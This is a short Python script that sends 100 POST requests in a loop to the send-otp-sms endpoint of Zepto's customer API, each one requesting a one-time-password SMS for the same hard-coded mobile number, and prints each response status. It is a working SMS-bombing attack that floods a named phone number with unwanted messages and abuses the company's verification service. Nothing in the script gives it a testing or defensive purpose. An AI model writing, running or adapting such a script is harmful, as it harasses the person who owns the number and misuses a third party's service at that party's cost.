import requests
from requests.structures import CaseInsensitiveDict

url = "https://api.zepto.co.in/api/v1/user/customer/send-otp-sms/"

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/json"

data = '{"mobileNumber":"6297420083"}'

for i in range(100):
        resp = requests.post(url, headers=headers, data=data)

        print(resp.status_code)
        
        
